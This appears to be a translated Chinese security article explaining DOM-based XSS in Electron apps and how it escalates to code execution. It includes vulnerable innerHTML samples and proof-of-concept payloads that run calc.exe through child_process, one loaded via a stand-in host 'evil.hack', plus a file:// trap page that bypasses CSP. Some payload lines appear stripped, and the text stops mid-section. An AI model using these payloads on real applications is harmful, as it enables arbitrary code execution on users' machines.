作者：[二向箔安全](https://mp.weixin.qq.com/s/DgjJ6uKtuUPFQhgztL69RQ)
基于 Electron 的 XSS 攻击实例，远比你想象的简单。
#### 什么是 Electron
也许你从未听说过跨平台 XSS，也从未听说过 Electron， 但你肯定知道 GitHub，或者使用过著名的 Atom 编辑器，
比如正在尝试翻译这篇文章的笔者，正在使用 Atom 来编写 Markdown。 Electron 优秀的跨平台特性，是本文的基础。
简单来说，Electron 是一个框架，用于方便开发者创建跨平台应用。 开发者可以通过它来使用 HTML + JavaScript 来开发桌面应用。
Electron 的用户非常广泛，因为它确实可以为不同平台提供同样的体验。
与传统观念的所谓“桌面应用”不同， Electron 应用包括两个部分（Node.js 和 Chromium）作为运行环境。
分别支持一个主进程和一个渲染进程， 其中，主进程是一个非常 Node.js 风格的进程， 而渲染进程是一个可以运行 Node.js 代码的 Chromium
内核浏览器。
由上文我们得知，Electron 应用是非常特殊的， 它本身是一个二进制应用，而渲染进程则是一个浏览器， 而 Electron
自身又具有很多的特性，所以，我们将从三个方面分析。
我们已知 Electron 的渲染进程是由 Chromium + Node.js 构成， 那么我们可以从分析传统 Web 应用的角度，得出这样的结论：
  * DOM 操作非常多、非常频繁
  * 基于 DOM 的 XSS 会变得很容易发生
  * 可以完成基于 JavaScript 的自由重定向（重定向至不可信站点）
所以，使用传统的 Web 应用分析套路来处理 Electron 是十分必要的。
#### 什么是 DOM-Based XSS
众所周知，DOM-Based XSS 的频发主要是因为 DOM 相关处理不当。 DOM-Based XSS 是因未经转义的用户输入被直接生成为 HTML
而产生。 一般而言，随着 DOM 操作的增多，DOM-Based XSS 发生的概率也会大大提高。 下面是两段 Electron 应用存在 DOM-Based XSS 的示例代码：
    // Demo 1
    fs.readFile( filename, (err,data) => {
      if(!err) element.innerHTML = data; //XSS!
    });
    // Demo 2
    fs.readdir( dirname, (err,files) => {
      files.forEach( (filename) => {
        let elm = document.createElement( "div" );
        elm.innerHTML = `${filename}`; //XSS!
        paerntElm.appendChild( elm );
        });
    });
对于 Electron 应用而言，一旦 DOM-Based XSS 发生将是灾难性的。 原因是：Node.js 在很多情况下是可以被攻击者进行代码注入的！
除此之外，一般观念里的 XSS = ALERT 在这里是不适用的。
XSS 还有诸多玩法：
  * 读写本地文件
  * 以任何协议进行通信
  * 通过接口与其他进程通信
  * 随意地启动其他程序（启动其他进程）
也就是说，通过 DOM-Based XSS 可能被用于执行二进制代码。 在后文中，我们将详细地研究在 Electron 中的 DOM-Based XSS。
#### 与传统的 XSS 的不同之处
现在我们进行一个对比， 对比传统的 Web 应用中的 XSS、浏览器沙盒中的 XSS 和 Electron 中的 XSS。
##### 传统的 Web 应用中的 XSS
  * 显示虚假信息、泄露 Cookie、泄露网站内信息……
  * 所有 JavaScript 在‘在网站内’能做的事
  * 除了‘网站内’的，啥都不能做
##### 被浏览器沙盒保护中的 XSS
  * 即使存在 XSS，对除了 XSS 所在网站的其他站点没有影响
  * 站点可以为自己存在的 XSS 承担责任，不影响其他人
##### 在 Electron 中的 XSS
  * 可以以当前用户权限启动任意代码
  * 所有用户能做的事情，Electron 中的 XSS 都可以做
  * 可以超过存在 XSS 的应用本身产生影响
#### 深入分析 Electron 中的 DOM-Based XSS
传统的 XSS 危害
  * 弹窗（ALERT）
  * 显示假消息（比如插入一个‘请输入密码’的文本框）
  * 打 Cookie（核心功能）
  * 盗取敏感信息（读取密码框内容等）
  * 其它……
Electron 的 DOM-Based XSS 使任意代码执行变为可能。 这意味着，DOM-Based XSS 获得了如同缓冲区溢出的攻击效果。
与传统的 DOM-Based XSS 相比，Electron 中的 DOM-Based：
  * 攻击向量选择更加多样，甚至可以与 HTTP 无关
  * HTML 生成数量少且不复杂，往往不会有非常多的依赖
因此，Electron 中的 DOM 操作必须更精细，严格转义是必要的。(渲染进程中可以使用 Node 函数) 基于这个特性，攻击者可以在此之中插入
Node 函数用于攻击， 比如，这是一个普通的 XSS 实例：
    // xss_source 是攻击者可以控制的字符串
    elm.innerHTML = xss_source; // XSS!
攻击者可以以下面的方式利用：
    // 弹计算器
    // 读取本地文件并发送
很多开发者使用 CSP 来限制 XSS 带来的影响， 那么这种方法是否适用于 Electron 的 DOM-Based XSS 呢？
答案是否定的。下面我们将通过几个例子来讲解。
在这种情况下，我们可以通过meta refresh来穿过 CSP：
    // 这是 index.js 中的内容
    elm.innerHTML = xss_source; // XSS!
    // 这是我们对 xss_source 的控制
    xss_source = '';
    // 这是 evil.hack 中的脚本内容
    require('child_process').exec('calc.exe',null);
以上过程成功地弹出了计算器。也就是说，Node 语句依然有效。 下面，我们介绍另一种思路，依然是先看一个示例：
    // index.js
    iframe.setAttribute("src", xss_source); // XSS!
    // 这是 main.js 的节选
    win = new BrowserWindow({width:600, height:400});
    win.loadURL(`file://${__dirname}/index.html`);
在这种情况下，我们可以构建：
    xss_source = 'file://remote-server/share/trap.html';
    // 下面是 trap.html 中的脚本
    window.top.location=`data:text/html,require('child_process').exec('calc.exe',null);`;
此方法依然成功的绕过了 CSP 限制， 原因是在 `main.js` 中的 `file://` 与 `trap.html` 中的 `file://`
被认为是同源的。
#### 私有 API 与架构的安全风险
接下来要内容是分析 Electron 自身带有的丰富的 API、函数和标签带来的安全问题。
##### 私有 API
  * 标签